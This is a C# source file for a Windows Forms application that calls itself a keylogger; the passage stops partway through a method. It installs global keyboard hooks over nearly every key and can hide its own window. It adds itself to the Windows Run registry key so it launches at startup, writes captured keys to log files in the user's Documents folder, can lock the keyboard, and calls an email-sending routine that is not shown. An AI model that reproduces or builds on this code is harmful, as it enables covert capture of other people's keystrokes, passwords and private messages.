using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.AccessControl;
using System.Security.Permissions;
using System.Diagnostics;
using Microsoft.Win32;
using System.Drawing.Drawing2D;


namespace KeyLogger_new
{
    public partial class Form1 : Form
    {
       

        private Utilities gkh = new Utilities();
        ResizeOrRelocate.Controls.Relocate relocate = new ResizeOrRelocate.Controls.Relocate ( );

        public Form1()
        {
            InitializeComponent();
           
        }
        //private const int CS_DROPSHADOW = 0x00020000;

        //protected override CreateParams CreateParams
        //{
        //    get
        //    {

        //        CreateParams p = base.CreateParams;
        //        p.ClassStyle |= CS_DROPSHADOW;
        //        p.ExStyle |= 0x00040000;
        //        return p;
        //    }
        //}
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }
        /// <summary>
        /// Dll files
        /// </summary>
        /// <param name="vkey"></param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vkey);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyStatr(int vKey);
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hwnd, string lpString, int cch);
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowThreadProcessId(IntPtr hwnd, out int lpdwProcessId);
        [DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hwnd);
        [DllImport("User32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);


        bool CapsLock ;
        bool NumLock ;
        bool ScrollLock;

        
        /// <summary>
        /// Variables declaration
        /// 
        /// </summary>

        bool isShiftKeyHit = false;
        bool isAltKeykOn = false;
        bool isCtrlKeyOn = false;
        bool isWindowChange = false;
     

        string savefilename=@"C:\Users\nb\Desktop\a.htm";
        string[] names; 
        string[] commands; 
        string[] status;
        string[] paths;


        string[] names1; 
        string[] Values1 ;
        string[] status1;
        string[] discription1;


        string[] initialword;
        string[] finalsentence;

        string command = null;
        int selected_listview_index = 0;
        string do_work_keys = "Space";
        string clear_keys = "Escape";
        string guess_keys = "Shift";
        bool startmonitoring = true;

        int titleHeight = 0;
        int titlewidth = 0;
        bool newwindowalert = true;
        Color backcolor = Color.Lime;

        /// <summary>
        /// Loading Function of the Form
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Form1_Load(object sender, EventArgs e)
        {
            
            this.Visible = false;
            menuStrip1.BackColor = Color.Transparent;
           //  Process[] pp  = Process.GetProcessesByName(this.AccessibleName); ;      
            load_all_settings_from_registry();
       
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\KeyLogger Data");
            savefilename = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\KeyLogger Data\" + "Log " + DateTime.Now.Year + DateTime.Now.Month + DateTime.Now.Day + DateTime.Now.DayOfWeek + ".htm" ;
            ///adding keys
            add_keys_to_the_list();
           
            ///creating global keyboard event (global hook)
            this.gkh.KeyDown += new KeyEventHandler(this.gkh_KeyDown);
            this.gkh.Keyup += new KeyEventHandler(this.gkh_KeyUp);
       
            listview_to_open_programs_adding_columns();           ////adding all necessary columns of listview command && system command
            add_items_to_the_listview();            
            add_items_to_the_listview_to_open_program();
            add_items_to_the_listviewguess_words();          
            senderemail ( );
           
  
        }


        private void single_frame_only()
        {
            this.ShowInTaskbar = false;
            this.Cursor = Cursors.SizeAll;

            menuStrip1.Visible = false;
            tabControl1.Visible = false;

            textBox_command2.Dock = DockStyle.Top;
            this.Size = new Size(this.Width, 26+27);
            Height = 26 + 27;
            
            //System.Drawing.Drawing2D.GraphicsPath shape = new System.Drawing.Drawing2D.GraphicsPath();
            //if (this.FormBorderStyle == FormBorderStyle.None)
            //{
            //    shape.AddRectangle(new Rectangle(textBox_command2.Location.X, textBox_command2.Location.Y, textBox_command2.Width + 2, textBox_command2.Height + 2));
            //    shape.AddRectangle(new Rectangle(textBox_command2.Location.X - 30, textBox_command2.Location.Y + 1, 20, textBox_command2.Height));
            //}
            //else
            //{
            //    Rectangle screenRectangle = RectangleToScreen(this.ClientRectangle);
            //    titleHeight = screenRectangle.Top - this.Top;
            //    titlewidth = screenRectangle.Left - this.Left;

            //   shape.AddRectangle(new Rectangle(textBox_command2.Location.X + titlewidth, textBox_command2.Location.Y + titleHeight, textBox_command2.Width + 2, textBox_command2.Height + 2));
            //   shape.AddRectangle(new Rectangle(textBox_command2.Location.X - 30 + titlewidth, textBox_command2.Location.Y + 1 + titleHeight, 20, textBox_command2.Height));
            //}
            //this.Region = new Region(shape);


        }
      
        /// <summary>
        /// save all settings in registry
        /// </summary>
        private void save_all_settings_default_and_user_created_in_registry()
        {
            readwrite_registy.write("Keys Settings", "Do Work Keys", do_work_keys);
            readwrite_registy.write("Keys Settings", "Clear Keys", clear_keys);
        }
        /// <summary>
        /// load all settings from registy
        /// </summary>
        private void load_all_settings_from_registry()
        {
            /// listview command to open  ....loading from registry
            clearRAM ( );
            try
            {              
            
              string hidden=  readwrite_registy.read ( "View", "Hide" ).ToString();
              if (hidden == "Yes")
              {
                  this.Hide();
                  this.Visible = false;
                  this.Size = new Size(0, 0);
                  this.FormBorderStyle = FormBorderStyle.None;
              }
              else
              {
                 
                  this.Visible = true;
                  this.Show();
                  this.Size = new System.Drawing.Size(747, 520);
                  this.FormBorderStyle = FormBorderStyle.Fixed3D;
              }
            }
            catch
            {
                 this.Show ( );
            }
            try
            {
                this.BackColor = Color.FromArgb ( int.Parse ( readwrite_registy.read ( "View", "Backcolor" ).ToString ( ) ) );
                backcolor = this.BackColor;     
            }
            catch
            {
                
            }           
            try
            {
                string interfacestle = readwrite_registy.read ( "View", "Interface" ).ToString ( );
                if (interfacestle == "Minimal")
                {
                    this.Cursor = Cursors.SizeAll;                  
                    single_frame_only();

                }
                
            }
            catch
            {               
            }
           
            try
            {
                string animate = readwrite_registy.read ( "View", "Animation" ).ToString ( );
                if (animate=="True" )
                {
                    animateColorToolStripMenuItem.Checked = true;
                 
                }
                else
                {
                    animateColorToolStripMenuItem.Checked = false;
                 

                }
            }
            catch
            {
                animateColorToolStripMenuItem.Checked = false;
            }

            try
            {
               string temp= readwrite_registy.read ( "View", "Image Mode" );
               if ( temp == "True" )
               {
                   showImageToolStripMenuItem.Checked = false;
                   showImageToolStripMenuItem_Click ( null, EventArgs.Empty );
               }
               else
               {
                   showImageToolStripMenuItem.Checked = true;
                   showImageToolStripMenuItem_Click ( null, EventArgs.Empty );
               }
            }

            catch
            {

            }
            try
            {
                int locx = int.Parse ( readwrite_registy.read ( "View", "LocationX" ) );
                int locy = int.Parse ( readwrite_registy.read ( "View", "LocationY" ) );
                this.Location = new Point ( locx, locy );
            }
            catch
            {

            }
            try
            {
                names = readwrite_registy.read_all_valuenames("names");
                commands = readwrite_registy.read_all_valuenames("commands");
                paths = readwrite_registy.read_all_valuenames("paths");
                status = readwrite_registy.read_all_values("names", names);
            }
            catch
            {
                //column contents
                names = new string[8] { "Notepad", "Calculator", "Sticky Notes", "Windows Feature", "Command Prompt", "Disk CleanUp", "On Screen Keyboard", "Task Manager"};
                commands = new string[8] { "notepad", "calc", "sticky", "feature", "cmd", "cleandisk", "osk", "task" };
                status = new string[8] { "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable" };
                paths = new string[8] { "notepad.exe", "calc.exe", "StikyNot.exe", "OptionalFeatures.exe", "cmd.exe", "cleanmgr.exe", "osk.exe", "taskmgr.exe"};

            }

            if (names == null)
            {
                //column contents
                names = new string[8] { "Notepad", "Calculator", "Sticky Notes", "Windows Feature", "Command Prompt", "Disk CleanUp", "On Screen Keyboard", "Task Manager" };
                commands = new string[8] { "notepad", "calc", "sticky", "feature", "cmd", "cleandisk", "osk", "task" };
                status = new string[8] { "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable" };
                paths = new string[8] { "notepad.exe", "calc.exe", "StikyNot.exe", "OptionalFeatures.exe", "cmd.exe", "cleanmgr.exe", "osk.exe", "taskmgr.exe" };

            }

            string userlogin = "False";
            try
            {
                userlogin = readwrite_registy.read("Settings", "User Login");
                if (userlogin != "True")
                {
                    if (MessageBox.Show("The end user is full responsible for the use of this software.\nDeveloper of this software donot take any credit how user use this software.\nClick OK to agree.", "License Agreement", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.OK)
                    {
                        readwrite_registy.write("Settings", "User Login", "True");
                    }
                    else
                    {
                        Environment.Exit(1);
                    }
                }
            }
            catch
            {
                readwrite_registy.write("Settings", "User Login", "False");
                if (MessageBox.Show("The end user is full responsible for the use of this software.\nDeveloper of this software donot take any credit how user use this software.\nClick OK to agree.", "License Agreement", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.OK)
                {
                    readwrite_registy.write("Settings", "User Login", "True");
                }
                else
                {
                    Environment.Exit(1);
                }
            }
            ///do work keys and clear keys
            ///
            try
            {
                do_work_keys = readwrite_registy.read("Keys Settings", "Do Work Keys");
                comboBox_do_work_key.Text = do_work_keys;

                clear_keys = readwrite_registy.read("Keys Settings", "Clear Keys");
                comboBox_clear_key.Text = clear_keys;

                guess_keys = readwrite_registy.read("Keys Settings", "Guess Key");
                comboBox_guess_words.Text = guess_keys;

                if (do_work_keys == "1")               ///if keys not found in registry the readwrite_registy.read() function returns 1
                {
                   
                    comboBox_clear_key.Text = "Space";
                    comboBox_do_work_key.Text = "Space";
                    comboBox_guess_words.Text = "Shift";
                    guess_keys = "Shift";
                    clear_keys = "Space";
                    do_work_keys = "Space";

                    readwrite_registy.write("Keys Settings", "Do Work Keys", "Space");
                    readwrite_registy.write("Keys Settings", "Clear Keys", "Space");
                    readwrite_registy.write("Keys Settings", "Guess Key", "Shift");

                    string path = Application.ExecutablePath;
                    string valueread = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Keylogger", null).ToString();
                    if (valueread != path)
                    {
                        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Keylogger", path);
                        runAtStartupToolStripMenuItem.Checked = true;
                    }
                    runAtStartupToolStripMenuItem.Checked = true;

                }
            }
            catch
            {

                comboBox_clear_key.Text = "Space";
                comboBox_do_work_key.Text = "Space";
                comboBox_guess_words.Text = "Shift";
                guess_keys = "Shift";
                clear_keys = "Space";
                do_work_keys = "Space";

                readwrite_registy.write("Keys Settings", "Do Work Keys", "Space");
                readwrite_registy.write("Keys Settings", "Clear Keys", "Space");
                readwrite_registy.write("Keys Settings", "Guess Key", "Shift");
            }

            ///listview system commands
            ///
            try
            {
                initialword = readwrite_registy.read_all_valuenames ( @"guess\command" );
                finalsentence = readwrite_registy.read_all_values ( @"guess\command",initialword );
          
            }
            catch
            {

            }

            ///listview guess words
            ///


            ///listview guess words
            ///

            try
            {
                discription1 = new string[13];

                discription1[0] = "Enables Monitoring mode of Keylogger";
                discription1[1] = "Disables Monitoring mode of Keylogger";
                discription1[2] = "Exits Keylogger";
                discription1[3] = "Starts new process";
               
                discription1[4] = "Changes mode to enable of all the commands of Keylogger";
                discription1[5] = "Changes mode to disable of all the commands of Keylogger";
                discription1[6] = "Hides the Keylogger Window";
                discription1[7] = "Shows the Keylogger Window";
                discription1[8] = "Locks all the Keys of the Keyboard";
                discription1[9] = "Unlocks all the Keys of the Keyboard";
                discription1[10] = "Displays Information about the Programmer";
                discription1[11] = "Shows Only Command textbox";
                discription1[12] = "Shows whole area of the window";

                names1 = readwrite_registy.read_all_valuenames(@"system\command");
                Values1 = readwrite_registy.read_all_values(@"system\command", names1);
                status1 = readwrite_registy.read_all_values(@"system\status", names1);

                if (names1.Length == 0)
                {
                    names1 = new string[13] { "Start Monitoring", "Stop Monitoring", "Exit Program", "Start new process", "Enable All Commands", "Disable All Commands", "Hide Program", "Show Program", "Lock Keyboard", "Unlock Keyboard", "Show Programmer's Info","Show Command textbox only","Show Whole area of Window" };
                    Values1 = new string[13] { "start", "stop", "exit", "startnew", "enable", "disable", "hide", "show", "lock", "unlock", "info","showtxt","showwh"};
                    status1 = new string[13] { "Enable", "Enable", "Enable", "Enable", " ", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable" };


                }

            }
            catch
            {
                ///column contents
                names1 = new string[13] { "Start Monitoring", "Stop Monitoring", "Exit Program", "Start new process", "Enable All Commands", "Disable All Commands", "Hide Program", "Show Program", "Lock Keyboard", "Unlock Keyboard", "Show Programmer's Info", "Show Command textbox only", "Show Whole area of Window" };
                Values1 = new string[13] { "start", "stop", "exit", "startnew", "enable", "disable", "hide", "show", "lock", "unlock", "info", "showtxt", "showwh" };
                status1 = new string[13] { "Enable", "Enable", "Enable", "Enable", " ", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable", "Enable" };

            }


            try
            {
                if ( readwrite_registy.read ( "Setting", "showkeys" ) == "check" )
                {
                    checkBox_showkeys.Checked = true;
                }
                else
                {
                    checkBox_showkeys.Checked = false;
                }

            }

            catch
            {
                checkBox_showkeys.Checked = false;
            }

            try
            {
                if ( readwrite_registy.read ( "Setting", "NotifyIcon" ) == "True" )
                {
                    checkBox_notify_icon.Checked = true;
                }
                else
                {
                    checkBox_notify_icon.Checked = false;
                }
            }
            catch
            {
                checkBox_notify_icon.Checked = false;
            }

            try
            {
                if ( readwrite_registy.read ( "Settings", "NewWindowAlert" ) == "True" )
                {
                    newwindowalert = true;

                }
                else
                {
                    newwindowalert = false;
                }
            }
            catch
            {
                newwindowalert = true;
            }

            try
            {
                if (readwrite_registy.read("Settings", "MatchCommand") == "True")
                {
                    matchCommandToolStripMenuItem.Checked = true;
                }
                else
                {
                    matchCommandToolStripMenuItem.Checked = false;
                }
            }
            catch
            {

            }

            try
            {
                if (Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Keylogger", null).ToString() != Application.ExecutablePath)
                {
                    runAtStartupToolStripMenuItem.Checked = false;

                }
                else
                {
                    runAtStartupToolStripMenuItem.Checked = true;
                }

            }
            catch
            {
                runAtStartupToolStripMenuItem.Checked = false;
              
            }
            
            clearRAM ( );

        }

        private void save_all_commands_in_registry()
        {
            try
            {
                readwrite_registy.delete_main_keys_from_registry(new string[] { "names", "commands", "paths" });

                foreach (ListViewItem item in listView_open_commands.Items)
                {
                    readwrite_registy.write("names", item.Text, item.SubItems[3].Text);
                    readwrite_registy.write("commands", item.SubItems[1].Text, "true");
                    readwrite_registy.write("paths", item.SubItems[2].Text, "true");

                }
            }
            catch
            {
                MessageBox.Show("Error : Unable to save Commnads");
            }
            clearRAM ( );
        }
        private void save_all_system_commands_in_registry()
        {
            try
            {
                readwrite_registy.delete_main_keys_from_registry(new string[] { "name", "command", "status" });

                foreach (ListViewItem item in listView_command.Items)
                {
                    readwrite_registy.write(@"system\command", item.Text, item.SubItems[1].Text);
                    readwrite_registy.write(@"system\status", item.Text, item.SubItems[2].Text);
             

                }
            }
            catch
            {
                MessageBox.Show("Error : Unable to save Commnads");
            }
            clearRAM ( );
        }

        private void save_all_guess_words_in_registry ( )
        {

            try
            {
                readwrite_registy.delete_main_keys_from_registry ( new string[] { @"guess\command"} );

                foreach ( ListViewItem item in listView_guess_words.Items )
                {
                    readwrite_registy.write ( @"guess\command", item.Text, item.SubItems[1].Text );                  


                }
            }
            catch
            {
                MessageBox.Show ( "Error : Unable to save Commnads" );
            }
            clearRAM ( );
        }

        /// <summary>
        /// apply all settings 
        /// </summary>
        private void apply_all_settings()
        {

        }
        /// <summary>
        /// Adding the Keys to the list of detectable keys
        /// the list is in another class called Utilities 
        ///  "gkh" is the object of the Utilites Class and  HookedKeys is the list in the Utilities Class
        /// </summary>
        ///
        private void add_keys_to_the_list()
        {
            this.gkh.HookedKeys.Add(Keys.A);
            this.gkh.HookedKeys.Add(Keys.Add);
            this.gkh.HookedKeys.Add(Keys.Alt);
            this.gkh.HookedKeys.Add(Keys.Apps);
            this.gkh.HookedKeys.Add(Keys.Attn);

            this.gkh.HookedKeys.Add(Keys.B);
            this.gkh.HookedKeys.Add(Keys.Back);
            this.gkh.HookedKeys.Add(Keys.BrowserBack);
            this.gkh.HookedKeys.Add(Keys.BrowserFavorites);
            this.gkh.HookedKeys.Add(Keys.BrowserForward);
            this.gkh.HookedKeys.Add(Keys.BrowserHome);
            this.gkh.HookedKeys.Add(Keys.BrowserRefresh);
            this.gkh.HookedKeys.Add(Keys.BrowserSearch);
            this.gkh.HookedKeys.Add(Keys.BrowserStop);

            this.gkh.HookedKeys.Add(Keys.C);
            this.gkh.HookedKeys.Add(Keys.Cancel);
            this.gkh.HookedKeys.Add(Keys.Capital);
            this.gkh.HookedKeys.Add(Keys.CapsLock);
            this.gkh.HookedKeys.Add(Keys.Clear);
            this.gkh.HookedKeys.Add(Keys.Control);
            this.gkh.HookedKeys.Add(Keys.ControlKey);
            this.gkh.HookedKeys.Add(Keys.Crsel);

            this.gkh.HookedKeys.Add(Keys.D);
            this.gkh.HookedKeys.Add(Keys.D0);
            this.gkh.HookedKeys.Add(Keys.D1);
            this.gkh.HookedKeys.Add(Keys.D2);
            this.gkh.HookedKeys.Add(Keys.D3);
            this.gkh.HookedKeys.Add(Keys.D4);
            this.gkh.HookedKeys.Add(Keys.D5);
            this.gkh.HookedKeys.Add(Keys.D6);
            this.gkh.HookedKeys.Add(Keys.D7);
            this.gkh.HookedKeys.Add(Keys.D8);
            this.gkh.HookedKeys.Add(Keys.D9);
            this.gkh.HookedKeys.Add(Keys.Decimal);
            this.gkh.HookedKeys.Add(Keys.Delete);
            this.gkh.HookedKeys.Add(Keys.Divide);
            this.gkh.HookedKeys.Add(Keys.Down);

            this.gkh.HookedKeys.Add(Keys.E);
            this.gkh.HookedKeys.Add(Keys.End);
            this.gkh.HookedKeys.Add(Keys.Enter);
            this.gkh.HookedKeys.Add(Keys.EraseEof);
            this.gkh.HookedKeys.Add(Keys.Escape);
            this.gkh.HookedKeys.Add(Keys.Execute);
            this.gkh.HookedKeys.Add(Keys.Exsel);

            
            this.gkh.HookedKeys.Add(Keys.F);
            this.gkh.HookedKeys.Add(Keys.F1);
            this.gkh.HookedKeys.Add(Keys.F10);
            this.gkh.HookedKeys.Add(Keys.F11);
            this.gkh.HookedKeys.Add(Keys.F12);
            this.gkh.HookedKeys.Add(Keys.F13);
            this.gkh.HookedKeys.Add(Keys.F14);
            this.gkh.HookedKeys.Add(Keys.F15);
            this.gkh.HookedKeys.Add(Keys.F16);
            this.gkh.HookedKeys.Add(Keys.F17);
            this.gkh.HookedKeys.Add(Keys.F18);
            this.gkh.HookedKeys.Add(Keys.F19);
            this.gkh.HookedKeys.Add(Keys.F2);
            this.gkh.HookedKeys.Add(Keys.F20);
            this.gkh.HookedKeys.Add(Keys.F21);
            this.gkh.HookedKeys.Add(Keys.F22);
            this.gkh.HookedKeys.Add(Keys.F23);
            this.gkh.HookedKeys.Add(Keys.F24);
            this.gkh.HookedKeys.Add(Keys.F3);
            this.gkh.HookedKeys.Add(Keys.F4);
            this.gkh.HookedKeys.Add(Keys.F5);
            this.gkh.HookedKeys.Add(Keys.F6);
            this.gkh.HookedKeys.Add(Keys.F7);
            this.gkh.HookedKeys.Add(Keys.F8);
            this.gkh.HookedKeys.Add(Keys.F9);
            this.gkh.HookedKeys.Add(Keys.FinalMode);

            this.gkh.HookedKeys.Add(Keys.G);

            this.gkh.HookedKeys.Add(Keys.H);
            this.gkh.HookedKeys.Add(Keys.HanguelMode);
            this.gkh.HookedKeys.Add(Keys.HangulMode);
            this.gkh.HookedKeys.Add(Keys.HanjaMode);
            this.gkh.HookedKeys.Add(Keys.Help);
            this.gkh.HookedKeys.Add(Keys.Home);

            this.gkh.HookedKeys.Add(Keys.I);
            this.gkh.HookedKeys.Add(Keys.IMEAccept);
            this.gkh.HookedKeys.Add(Keys.IMEAceept);
            this.gkh.HookedKeys.Add(Keys.IMEConvert);
            this.gkh.HookedKeys.Add(Keys.IMEModeChange);
            this.gkh.HookedKeys.Add(Keys.IMENonconvert);
            this.gkh.HookedKeys.Add(Keys.Insert);
            
            this.gkh.HookedKeys.Add(Keys.J);
            this.gkh.HookedKeys.Add(Keys.JunjaMode);

            this.gkh.HookedKeys.Add(Keys.K);
            this.gkh.HookedKeys.Add(Keys.KanaMode);
            this.gkh.HookedKeys.Add(Keys.KanjiMode);
            this.gkh.HookedKeys.Add(Keys.KeyCode);

            this.gkh.HookedKeys.Add(Keys.L);
            this.gkh.HookedKeys.Add(Keys.LaunchApplication1);
            this.gkh.HookedKeys.Add(Keys.LaunchApplication2);
            this.gkh.HookedKeys.Add(Keys.LaunchMail);
            this.gkh.HookedKeys.Add(Keys.LButton);
            this.gkh.HookedKeys.Add(Keys.LControlKey);
            this.gkh.HookedKeys.Add(Keys.Left);
            this.gkh.HookedKeys.Add(Keys.LineFeed);
            this.gkh.HookedKeys.Add(Keys.LMenu);
            this.gkh.HookedKeys.Add(Keys.LShiftKey);
            this.gkh.HookedKeys.Add(Keys.LWin);

            this.gkh.HookedKeys.Add(Keys.M);
            this.gkh.HookedKeys.Add(Keys.MButton);
            this.gkh.HookedKeys.Add(Keys.MediaNextTrack);
            this.gkh.HookedKeys.Add(Keys.MediaPreviousTrack);
            this.gkh.HookedKeys.Add(Keys.MediaPlayPause);
            this.gkh.HookedKeys.Add(Keys.MediaStop);
            this.gkh.HookedKeys.Add(Keys.Menu);
            this.gkh.HookedKeys.Add(Keys.Modifiers);
            this.gkh.HookedKeys.Add(Keys.Multiply);

            this.gkh.HookedKeys.Add(Keys.N);
            this.gkh.HookedKeys.Add(Keys.Next);
            this.gkh.HookedKeys.Add(Keys.NoName);
            this.gkh.HookedKeys.Add(Keys.None);
            this.gkh.HookedKeys.Add(Keys.NumLock);
            this.gkh.HookedKeys.Add(Keys.NumPad0);
            this.gkh.HookedKeys.Add(Keys.NumPad1);
            this.gkh.HookedKeys.Add(Keys.NumPad2);
            this.gkh.HookedKeys.Add(Keys.NumPad3);
            this.gkh.HookedKeys.Add(Keys.NumPad4);
            this.gkh.HookedKeys.Add(Keys.NumPad5);
            this.gkh.HookedKeys.Add(Keys.NumPad6);
            this.gkh.HookedKeys.Add(Keys.NumPad7);
            this.gkh.HookedKeys.Add(Keys.NumPad8);
            this.gkh.HookedKeys.Add(Keys.NumPad9);

            this.gkh.HookedKeys.Add(Keys.O);
            this.gkh.HookedKeys.Add(Keys.Oem1);
            this.gkh.HookedKeys.Add(Keys.Oem102);
            this.gkh.HookedKeys.Add(Keys.Oem2);
            this.gkh.HookedKeys.Add(Keys.Oem3);
            this.gkh.HookedKeys.Add(Keys.Oem4);
            this.gkh.HookedKeys.Add(Keys.Oem5);
            this.gkh.HookedKeys.Add(Keys.Oem6);
            this.gkh.HookedKeys.Add(Keys.Oem7);
            this.gkh.HookedKeys.Add(Keys.Oem8);
            this.gkh.HookedKeys.Add(Keys.OemBackslash);
            this.gkh.HookedKeys.Add(Keys.OemClear);
            this.gkh.HookedKeys.Add(Keys.OemCloseBrackets);
            this.gkh.HookedKeys.Add(Keys.Oemcomma);
            this.gkh.HookedKeys.Add(Keys.OemMinus);
            this.gkh.HookedKeys.Add(Keys.OemOpenBrackets);
            this.gkh.HookedKeys.Add(Keys.OemPeriod);
            this.gkh.HookedKeys.Add(Keys.OemPipe);
            this.gkh.HookedKeys.Add(Keys.Oemplus);
            this.gkh.HookedKeys.Add(Keys.OemQuestion);
            this.gkh.HookedKeys.Add(Keys.OemQuotes);
            this.gkh.HookedKeys.Add(Keys.OemSemicolon);
            this.gkh.HookedKeys.Add(Keys.Oemtilde);

            this.gkh.HookedKeys.Add(Keys.P);
            this.gkh.HookedKeys.Add(Keys.Pa1);
            this.gkh.HookedKeys.Add(Keys.Packet);
            this.gkh.HookedKeys.Add(Keys.PageDown);
            this.gkh.HookedKeys.Add(Keys.PageUp);
            this.gkh.HookedKeys.Add(Keys.Pause);
            this.gkh.HookedKeys.Add(Keys.Play);
            this.gkh.HookedKeys.Add(Keys.Print);
            this.gkh.HookedKeys.Add(Keys.PrintScreen);
            this.gkh.HookedKeys.Add(Keys.Prior);
            this.gkh.HookedKeys.Add(Keys.ProcessKey);

            this.gkh.HookedKeys.Add(Keys.Q);

            this.gkh.HookedKeys.Add(Keys.R);
            this.gkh.HookedKeys.Add(Keys.RButton);
            this.gkh.HookedKeys.Add(Keys.RControlKey);
            this.gkh.HookedKeys.Add(Keys.Return);
            this.gkh.HookedKeys.Add(Keys.Right);
            this.gkh.HookedKeys.Add(Keys.RMenu);
            this.gkh.HookedKeys.Add(Keys.RShiftKey);
            this.gkh.HookedKeys.Add(Keys.RWin);

            this.gkh.HookedKeys.Add(Keys.S);
            this.gkh.HookedKeys.Add(Keys.Scroll);
            this.gkh.HookedKeys.Add(Keys.Select);
            this.gkh.HookedKeys.Add(Keys.SelectMedia);
            this.gkh.HookedKeys.Add(Keys.Separator);
            this.gkh.HookedKeys.Add(Keys.Shift);
            this.gkh.HookedKeys.Add(Keys.ShiftKey);
            this.gkh.HookedKeys.Add(Keys.Sleep);
            this.gkh.HookedKeys.Add(Keys.Snapshot);
            this.gkh.HookedKeys.Add(Keys.Space);
            this.gkh.HookedKeys.Add(Keys.Subtract);

            this.gkh.HookedKeys.Add(Keys.T);
            this.gkh.HookedKeys.Add(Keys.Tab);

            this.gkh.HookedKeys.Add(Keys.U);
            this.gkh.HookedKeys.Add(Keys.Up);

            this.gkh.HookedKeys.Add(Keys.V);
            this.gkh.HookedKeys.Add(Keys.VolumeDown);
            this.gkh.HookedKeys.Add(Keys.VolumeMute);
            this.gkh.HookedKeys.Add(Keys.VolumeUp);

            this.gkh.HookedKeys.Add(Keys.W);

            this.gkh.HookedKeys.Add(Keys.X);
            this.gkh.HookedKeys.Add(Keys.XButton1);
            this.gkh.HookedKeys.Add(Keys.XButton2);

            this.gkh.HookedKeys.Add(Keys.Y);

            this.gkh.HookedKeys.Add(Keys.Z);
            this.gkh.HookedKeys.Add(Keys.Zoom);
            clearRAM ( );

        }
        /// <summary>
        /// global keyup event function
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void gkh_KeyUp(object sender, KeyEventArgs e)
        {
          
            CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;                        
            NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
            ScrollLock = (((ushort)GetKeyState(0x91)) & 0xffff) != 0;
           
                if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
                {
                    isShiftKeyHit = false;
                }
                if (e.KeyCode == Keys.RControlKey || e.KeyCode == Keys.LControlKey)
                {
                    isCtrlKeyOn = false;
                }
                if (e.KeyCode == Keys.RMenu || e.KeyCode == Keys.LMenu)
                {
                    isAltKeykOn = false;
                }
                display_all_info_after_a_key_is_pressed_down_or_up();             
                e.Handled = false;
                clearRAM ( );
            
            
        }
        /// <summary>
        /// global keydown event function
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void gkh_KeyDown(object sender, KeyEventArgs e)
        {
           
           
            CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;

            NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;

            ScrollLock = (((ushort)GetKeyState(0x91)) & 0xffff) != 0;
            if (checkBox_lock_keyboard.Checked == false)
            {
                e.Handled = false;                            ///unlock keyboard
            }
            else
            {
                e.Handled = true;                   ///lock keyboard 

            }
            if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
            {
                isShiftKeyHit = true;
            }
            if (e.KeyCode == Keys.RControlKey || e.KeyCode == Keys.LControlKey)
            {
                isCtrlKeyOn = true;
            }
            if (e.KeyCode == Keys.RMenu || e.KeyCode == Keys.LMenu)
            {
                isAltKeykOn = true;
            }

             toogle_keys_settings(e.KeyCode);
            //MessageBox.Show("keys pressed");
        

            display_all_info_after_a_key_is_pressed_down_or_up();
            display_all_info_after_a_key_is_pressed_DOWN_ONLY(e.KeyCode);
            //NativeWin32.SetForegroundWindow(NativeWin32.GetDesktopWindow());
            //NativeWin32.SendMessage(NativeWin32.GetDesktopWindow(), 1234, 1, 1);
            //NativeWin32.GetParent(NativeWin32.GetDesktopWindow());
            clearRAM ( );

        }
        /// <summary>
        /// display info after a key is pressed up or down
        /// 
        /// </summary>
        private void display_all_info_after_a_key_is_pressed_down_or_up()
        {
            label_shift.Text = "Shift : " + isShiftKeyHit.ToString();
            label_control.Text = "Ctrl : " + isCtrlKeyOn.ToString();
            label_alt.Text = "Alt : " + isAltKeykOn.ToString();
            
            
        }
        /// <summary>
        /// display info after a key is pressed DOWN ONLY
        /// 
        /// 
        /// FIRST : find out the window
        /// SECOND: Write in file
        /// </summary>
        private void display_all_info_after_a_key_is_pressed_DOWN_ONLY(Keys keypressed)
        {
            textBox_all_pressed_key.SelectionColor = Color.Blue;
            if ( checkBox_showkeys.Checked )
            {
                if ( Application.OpenForms["display_pressed_key"] == null )
                {

                    display_pressed_key form = new display_pressed_key ( keypressed);
                    form.Show ( );
                }
                else
                {

